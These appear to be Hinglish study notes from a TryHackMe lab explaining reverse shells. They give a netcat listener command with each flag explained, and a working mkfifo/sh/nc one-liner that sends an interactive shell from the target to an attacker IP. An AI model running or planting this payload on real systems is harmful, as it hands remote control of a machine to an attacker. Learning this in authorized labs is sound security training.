# PART 5 — REVERSE SHELL

## 1. Reverse Shell kya hai?

Reverse shell mein **target machine attacker ki machine se connection initiate karti hai**.

Normal mental model:

```text
Attacker ← Target
```

Target attacker ko connection back karta hai.

---

## 2. Roles

Suppose:

```text
Attacker / AttackBox
10.49.96.76

Target
10.49.164.227
```

Reverse shell mein:

```text
Target 10.49.164.227
        ↓
Attacker 10.49.96.76
```

### Important memory

> **Reverse shell = Target connects BACK to attacker.**

---

## 3. Listener

Attacker side par listener:

```bash
nc -lvnp 8081
```

Breakdown:

```text
nc
```

Netcat.

```text
-l
```

Listen mode.

```text
-v
```

Verbose — connection information show karo.

```text
-n
```

DNS resolution avoid karo; IP directly use karo.

```text
-p 8081
```

Port `8081` par listen karo.

---

## 4. Reverse shell payload

Authorized THM lab example:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.49.96.76 8081 >/tmp/f
```

Iska overall purpose:

```text
Target
  ↓
shell create
  ↓
Netcat connection
  ↓
Attacker:8081
```

### Important mistake

Agar target ka web application already:

```text
10.49.164.227:8081
```

par chal raha hai, iska matlab ye nahi ki tum wahan shell listener se connect karoge.

Listener **attacker machine** par hona chahiye:

```text
10.49.96.76:8081
```

